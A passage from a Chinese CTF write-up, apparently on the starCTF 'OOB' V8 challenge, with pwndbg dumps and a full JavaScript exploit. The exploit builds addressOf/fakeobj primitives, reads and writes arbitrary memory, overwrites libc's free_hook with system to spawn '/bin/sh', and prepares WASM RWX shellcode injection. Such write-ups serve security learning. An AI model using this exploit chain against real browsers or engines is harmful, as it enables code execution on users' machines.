HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x3fb2ce6c2f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="keyword">constructor</span>: 0x39ddc5310ec1 &lt;JSFunction Array (sfi = 0x18405dc0aca1)&gt;</span><br><span class="line"> - dependent code: 0x2df35e6402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x39ddc5310ec1-1</span><br><span class="line">0x39ddc5310ec0:0x00003fb2ce6c2d490x000039ddc5311029</span><br><span class="line">0x39ddc5310ed0:0x00002df35e640c710x000018405dc0aca1</span><br><span class="line">0x39ddc5310ee0:0x000039ddc53018690x000018405dc00699</span><br><span class="line">0x39ddc5310ef0:0x000011c169a06c010x00003fb2ce6c2d99</span><br><span class="line">0x39ddc5310f00:0x00002df35e6402710x0000000000080008</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x 0x39ddc5310ef0-0x39ddc5310ec0</span><br><span class="line">$1 = 0x30</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x11c169a06c01+0x40-1</span><br><span class="line">00:0000│   0x11c169a06c40 ◂— movabs r10, 0x7f5949700fa0</span><br><span class="line">01:0008│   0x11c169a06c48 ◂— add    byte ptr [rax], al</span><br><span class="line">02:0010│   0x11c169a06c50 ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line">04:0020│   0x11c169a06c60 —▸ 0x2df35e640a31 ◂— 0x2df35e6401</span><br><span class="line">05:0028│   0x11c169a06c68 —▸ 0x2df35e642c01 ◂— 0x2df35e6407</span><br><span class="line">06:0030│   0x11c169a06c70 —▸ 0x2df35e640c71 ◂— 0x2df35e6408</span><br><span class="line">07:0038│   0x11c169a06c78 —▸ 0x2df35e642791 ◂— 0x2df35e6407</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap 0x7f5949700fa0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7f5948274000     0x7f5949d8a000 r-xp  1b16000 136c000 /home/focu5/chromium/v8/out.gn/x64.debug/libv8.so +0x148cfa0</span><br></pre></td></tr></table></figure><p>在<code>release</code>版本下，则会泄露出 <code>d8</code>的地址</p><h4 id="本地shell"><a href="#本地shell" class="headerlink" title="本地shell"></a>本地shell</h4><p>有了<code>libc</code>剩下就可以和常规<code>pwn</code>一样了，有任意地址写，直接写<code>free_hook</code>就好。</p><p>在调试的时候发现写0x7f…这样的地址写不上去，看<a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/">e3pem师傅的博客</a>发现另一种写法</p><blockquote><p>这里有另外一种方式来解决这个问题，DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>，修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var data_buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">var data_view &#x3D; new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr &#x3D; addressOf(data_buf) + 0x20n;</span><br><span class="line">function writeDataview(addr,data)&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(0, data, true);</span><br><span class="line">    console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    floatArrayMap,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeobj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get shell</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> d8_addr = read64(code_addr + <span class="number">0x41n</span>) - <span class="number">0x8424e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc d8_addr: 0x&quot;</span> + hex(d8_addr));</span><br><span class="line">got_printf = d8_addr + <span class="number">0xb073c8n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] got_printf: 0x&quot;</span> + hex(got_printf));</span><br><span class="line">libc_base = read64(got_printf)- <span class="number">0x64f00n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc: 0x&quot;</span> + hex(libc_base));</span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line">system = libc_base + <span class="number">0x4f4e0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook: 0x&quot;</span> + hex(free_hook));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] system: 0x&quot;</span> + hex(system));</span><br><span class="line">writeDataview(free_hook, system)</span><br><span class="line"><span class="keyword">var</span> shell_str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;/bin/sh\0&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure><h4 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h4><blockquote><p><strong>WebAssembly</strong>或称<strong>wasm</strong>是一个实验性的<a href="https://zh.wikipedia.org/wiki/%E4%BD%8E%E7%BA%A7%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">低级编程语言</a>，应用于<a href="https://zh.wikipedia.org/wiki/%E7%80%8F%E8%A6%BD%E5%99%A8">浏览器</a>内的<a href="https://zh.wikipedia.org/wiki/%E5%AE%A2%E6%88%B6%E7%AB%AF">客户端</a>。WebAssembly是便携式的<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9">抽象语法树</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-1">1]</a>，被设计来提供比<a href="https://zh.wikipedia.org/wiki/JavaScript">JavaScript</a>更快速的<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E8%AF%91">编译</a>及运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-github.com-2">2]</a>。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以<a href="https://zh.wikipedia.org/wiki/C%E8%AA%9E%E8%A8%80">C</a>/<a href="https://zh.wikipedia.org/wiki/C%2B%2B">C++</a>作为实现目标）编译，再藉虚拟机引擎在浏览器内运行[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-3">3]</a>。WebAssembly的开发团队分别来自<a href="https://zh.wikipedia.org/wiki/Mozilla%E5%9F%BA%E9%87%91%E6%9C%83">Mozilla</a>、<a href="https://zh.wikipedia.org/wiki/Google">Google</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E8%BB%9F">Microsoft</a>、<a href="https://zh.wikipedia.org/wiki/%E8%98%8B%E6%9E%9C%E5%85%AC%E5%8F%B8">Apple</a>，代表着四大网络浏览器<a href="https://zh.wikipedia.org/wiki/Firefox">Firefox</a>、<a href="https://zh.wikipedia.org/wiki/Google_Chrome">Chrome</a>、<a href="https://zh.wikipedia.org/wiki/Microsoft_Edge">Microsoft Edge</a>、<a href="https://zh.wikipedia.org/wiki/Safari">Safari</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-4">4]</a>。2017年11月，以上四个浏览器都开始实验性的支持WebAssembly[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-5">5]</a>[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-6">6]</a>。WebAssembly 于 2019 年 12 月 5 日成为万维网联盟（W3C）的推荐，与 HTML，CSS 和 JavaScript 一起，成为 Web 的第四种语言。[<a href="https://zh.wikipedia.org/wiki/WebAssembly#cite_note-7">7]</a>。</p></blockquote><p><a href="https://wasdk.github.io/WasmFiddle/%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BA%BF%E5%B0%86C%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2%E4%B8%BAwasm%E5%B9%B6%E7%94%9F%E6%88%90JS%E9%85%8D%E5%A5%97%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82">https://wasdk.github.io/WasmFiddle/，这个网站可以在线将C语言直接转换为wasm并生成JS配套调用代码。</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> d = f();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] return from wasm: &quot;</span> + d);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/v8/out.gn/x64.debug$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">[*] return from wasm: 42</span></span><br><span class="line"><span class="comment">Trace/breakpoint trap (core dumped)*/</span></span><br></pre></td></tr></table></figure><p>在<code>js</code>代码中加入<code>wasm</code>之后，程序中会存在一个<code>rwx</code>的段，我们可以把<code>shellcode</code>放到这个段里面，再跳过去执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*利用job命令查看函数结构对象，经过Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance等一系列调用关系，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">DebugPrint: 0x59fa561fab9: [Function] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x059fa5602109 &lt;JSFunction (sfi = 0xa1f9e548039)&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x1de519340c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - function prototype: &lt;no-prototype-slot&gt;</span></span><br><span class="line"><span class="comment"> - shared_info: 0x059fa561fa81 &lt;SharedFunctionInfo 0&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - context: 0x059fa5601869 &lt;NativeContext[246]&gt;</span></span><br><span class="line"><span class="comment"> - code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - WASM instance 0x59fa561f8c1</span></span><br><span class="line"><span class="comment"> - WASM function index 0</span></span><br><span class="line"><span class="comment"> - properties: 0x1de519340c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x0a1f9e5404b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #name: 0x0a1f9e540449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #arguments: 0x0a1f9e540369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment">    #caller: 0x0a1f9e5403d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa81</span></span><br><span class="line"><span class="comment">0x59fa561fa81: [SharedFunctionInfo] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de5193409e1 &lt;Map[56]&gt;</span></span><br><span class="line"><span class="comment"> - name: 0x1de519344ae1 &lt;String[#1]: 0&gt;</span></span><br><span class="line"><span class="comment"> - kind: NormalFunction</span></span><br><span class="line"><span class="comment"> - function_map_index: 144</span></span><br><span class="line"><span class="comment"> - formal_parameter_count: 0</span></span><br><span class="line"><span class="comment"> - expected_nof_properties: 0</span></span><br><span class="line"><span class="comment"> - language_mode: sloppy</span></span><br><span class="line"><span class="comment"> - data: 0x059fa561fa59 &lt;WasmExportedFunctionData&gt;</span></span><br><span class="line"><span class="comment"> - code (from data): 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - function token position: -1</span></span><br><span class="line"><span class="comment"> - start position: -1</span></span><br><span class="line"><span class="comment"> - end position: -1</span></span><br><span class="line"><span class="comment"> - no debug info</span></span><br><span class="line"><span class="comment"> - scope info: 0x1de519340c61 &lt;ScopeInfo[0]&gt;</span></span><br><span class="line"><span class="comment"> - length: 0</span></span><br><span class="line"><span class="comment"> - feedback_metadata: 0x1de519342a39: [FeedbackMetadata]</span></span><br><span class="line"><span class="comment"> - map: 0x1de519341319 &lt;Map&gt;</span></span><br><span class="line"><span class="comment"> - slot_count: 0</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561fa59</span></span><br><span class="line"><span class="comment">0x59fa561fa59: [WasmExportedFunctionData] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x1de519345879 &lt;Map[40]&gt;</span></span><br><span class="line"><span class="comment"> - wrapper_code: 0x3f2b78882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span></span><br><span class="line"><span class="comment"> - instance: 0x059fa561f8c1 &lt;Instance map = 0x3e43f7c49789&gt;</span></span><br><span class="line"><span class="comment"> - function_index: 0</span></span><br><span class="line"><span class="comment">pwndbg&gt; job 0x059fa561f8c1</span></span><br><span class="line"><span class="comment">0x59fa561f8c1: [WasmInstanceObject] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3e43f7c49789 &lt;Map(HOLEY_ELEMENTS)&gt; 